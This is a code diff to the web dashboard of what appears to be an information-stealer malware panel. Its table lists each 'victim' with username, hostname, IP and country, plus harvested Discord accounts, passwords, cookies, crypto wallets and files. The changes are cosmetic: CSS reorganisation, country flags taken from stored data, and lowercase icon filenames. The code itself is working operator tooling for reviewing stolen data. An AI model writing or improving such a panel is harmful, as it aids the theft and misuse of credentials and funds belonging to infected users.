@@ -462,6 +462,12 @@
             gap: 4px;
             flex-wrap: wrap;
         }
+        .icon-img-wrapper {
+            position: relative;
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+        }
         .icon-img {
             width: 28px;
             height: 28px;
@@ -471,12 +477,28 @@
             padding: 2px;
             transition: transform 0.15s ease, box-shadow 0.15s ease;
             cursor: pointer;
+            display: block;
         }
         .icon-img:hover {
             transform: scale(1.2);
             box-shadow: 0 0 15px rgba(0,170,255,0.4);
             z-index: 10;
             position: relative;
+        }
+        .icon-img-fallback {
+            display: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 4px;
+            background: linear-gradient(135deg, var(--bg-tertiary), rgba(170,85,255,0.1));
+            align-items: center;
+            justify-content: center;
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            position: absolute;
+            top: 0;
+            left: 0;
         }
         .icon-overflow {
             display: inline-flex;
@@ -710,44 +732,6 @@
         .scrollbar-placeholder { display: none; }
         .hits-table-wrap { overflow-x: auto; }
         .hits-table-wrap::-webkit-scrollbar { display: none; }
-        .icon-img-wrapper {
-            position: relative;
-            display: inline-block;
-            width: 28px;
-            height: 28px;
-        }
-        .icon-img {
-            width: 28px;
-            height: 28px;
-            border-radius: 4px;
-            object-fit: contain;
-            background: var(--bg-tertiary);
-            padding: 2px;
-            transition: transform 0.15s ease, box-shadow 0.15s ease;
-            cursor: pointer;
-            display: block;
-        }
-        .icon-img:hover {
-            transform: scale(1.2);
-            box-shadow: 0 0 15px rgba(0,170,255,0.4);
-            z-index: 10;
-            position: relative;
-        }
-        .icon-img-fallback {
-            display: none;
-            width: 28px;
-            height: 28px;
-            border-radius: 4px;
-            background: linear-gradient(135deg, var(--bg-tertiary), rgba(170,85,255,0.1));
-            align-items: center;
-            justify-content: center;
-            font-size: 0.6rem;
-            font-weight: 600;
-            color: var(--text-secondary);
-            position: absolute;
-            top: 0;
-            left: 0;
-        }
     </style>
 </head>
 <body>
@@ -870,35 +854,9 @@
                 });
             }
 
-            function getCountryCode(ip) {
-                // Simple mapping from IP to country (you can expand this)
-                const map = {
-                    'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada',
-                    'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain',
-                    'RU': 'Russia', 'CN': 'China', 'IN': 'India', 'BR': 'Brazil',
-                    'AU': 'Australia', 'JP': 'Japan', 'KR': 'South Korea', 'MX': 'Mexico',
-                    'ZA': 'South Africa', 'EG': 'Egypt', 'SA': 'Saudi Arabia', 'TR': 'Turkey',
-                    'NL': 'Netherlands', 'SE': 'Sweden', 'PL': 'Poland', 'UA': 'Ukraine',
-                    'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia', 'PE': 'Peru',
-                    'NG': 'Nigeria', 'KE': 'Kenya', 'SG': 'Singapore', 'MY': 'Malaysia',
-                    'PH': 'Philippines', 'VN': 'Vietnam', 'TH': 'Thailand', 'ID': 'Indonesia',
-                    'PK': 'Pakistan', 'BD': 'Bangladesh', 'IR': 'Iran', 'IQ': 'Iraq',
-                    'IL': 'Israel', 'AE': 'UAE', 'BE': 'Belgium', 'CH': 'Switzerland',
-                    'AT': 'Austria', 'GR': 'Greece', 'PT': 'Portugal', 'IE': 'Ireland',
-                    'NO': 'Norway', 'FI': 'Finland', 'DK': 'Denmark', 'CZ': 'Czechia',
-                    'HU': 'Hungary', 'RO': 'Romania', 'BG': 'Bulgaria', 'RS': 'Serbia',
-                    'HR': 'Croatia', 'SK': 'Slovakia', 'SI': 'Slovenia', 'LT': 'Lithuania',
-                    'LV': 'Latvia', 'EE': 'Estonia', 'NZ': 'New Zealand'
-                };
-                // If IP starts with known prefix, return a random country for demo
-                // In real app, you'd use an IP geolocation API
-                const prefixes = Object.keys(map);
-                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-                return { code: prefix, name: map[prefix] };
-            }
-
-            function getFlagUrl(code) {
-                return `https://flagcdn.com/16x12/${code.toLowerCase()}.png`;
+            function getFlagUrl(countryCode) {
+                if (!countryCode) return '';
+                return `https://flagcdn.com/16x12/${countryCode.toLowerCase()}.png`;
             }
 
             function formatTime(timestamp) {
@@ -1005,7 +963,10 @@
                     const username = v.username || 'Unknown';
                     const pcName = v.hostname || 'N/A';
                     const ip = v.ip || 'N/A';
-                    const countryInfo = ip !== 'N/A' ? getCountryCode(ip) : null;
+                    // Use country from database, fallback to 'Unknown'
+                    const country = v.country || null;
+                    const countryCode = country ? country.slice(0, 2) : null;
+                    const flagUrl = countryCode ? getFlagUrl(countryCode) : null;
                     const tag = data.tag || 'Default';
                     const env = data.executionEnvironment || 'EXE';
                     const mcUsername = data.minecraftUsername || null;
@@ -1018,15 +979,7 @@
                     const favourites = v.favourited || false;
                     const time = v.timestamp || new Date().toISOString();
 
-                    const hasDiscord = discordAccounts.length > 0;
-                    const hasPasswords = filteredPasswords.length > 0;
-                    const hasCookies = cookies.length > 0;
-                    const hasWallets = walletNames.length > 0;
-                    const hasFiles = additionalFiles.length > 0;
-
                     // Generate row
-                    const uniqueId = 'row-' + Date.now() + '-' + idx;
-
                     html += `
                         <tr data-uuid="${v.id}">
                             <td>
@@ -1039,7 +992,7 @@
                                 <div class="ip-info">
                                     <span class="ip-address" onclick="copyToClipboard('${escapeHtml(ip)}')">${escapeHtml(ip)}</span>
                                     <span class="ip-country">
-                                        ${countryInfo ? `<img src="${getFlagUrl(countryInfo.code)}" class="country-flag" onerror="this.style.display='none'"> ${countryInfo.name}` : '<span class="country-unknown">Unknown</span>'}
+                                        ${flagUrl ? `<img src="${flagUrl}" class="country-flag" onerror="this.style.display='none'"> ${escapeHtml(country)}` : '<span class="country-unknown">Unknown</span>'}
                                     </span>
                                 </div>
                             </td>
@@ -1114,10 +1067,11 @@
                 const maxVisible = 3;
                 const visible = items.slice(0, maxVisible);
                 const overflow = items.length - maxVisible;
-            
+
                 let html = '<div class="icon-group">';
                 visible.forEach(name => {
-                    const safeName = encodeURIComponent(name);
+                    // Use lowercase for the filename
+                    const safeName = encodeURIComponent(name.toLowerCase());
                     const imgSrc = `/icons/small/${folder}/${safeName}.png`;
                     html += `<div class="icon-img-wrapper">
                         <img src="${imgSrc}" alt="${escapeHtml(name)}" class="icon-img" data-name="${escapeHtml(name)}" 
@@ -1156,8 +1110,7 @@
 
             function setupIconTooltips() {
                 const tooltip = document.getElementById('iconTooltip');
-                        
-                // Single icon hover
+
                 document.querySelectorAll('.icon-img').forEach(el => {
                     el.addEventListener('mouseenter', (e) => {
                         const name = e.target.dataset.name;
@@ -1169,24 +1122,23 @@
                         tooltip.classList.remove('visible');
                     });
                 });
-            
-                // Overflow hover (show all icons with images)
+
                 document.querySelectorAll('.icon-overflow').forEach(el => {
                     el.addEventListener('mouseenter', (e) => {
                         const category = el.dataset.category;
                         const items = JSON.parse(el.dataset.items || '[]');
                         if (items.length === 0) return;
-                    
+
                         const categoryMap = {
                             'Browsers': 'browsers',
                             'Wallets': 'wallets',
                             'Apps': 'applications'
                         };
                         const folder = categoryMap[category] || category.toLowerCase();
-                    
+
                         let html = `<div class="tooltip-title">All ${category}</div><div class="tooltip-items">`;
                         items.forEach(name => {
-                            const safeName = encodeURIComponent(name);
+                            const safeName = encodeURIComponent(name.toLowerCase());
                             const imgSrc = `/icons/small/${folder}/${safeName}.png`;
                             html += `<div class="tooltip-item">
                                 <img src="${imgSrc}" onerror="this.style.display='none'" style="width:16px;height:16px;border-radius:2px;object-fit:contain;background:var(--bg-tertiary);padding:1px;">
@@ -1194,7 +1146,7 @@
                             </div>`;
                         });
                         html += '</div>';
-                    
+
                         tooltip.innerHTML = html;
                         tooltip.classList.add('visible', 'overflow-mode');
                         positionTooltip(el, tooltip);
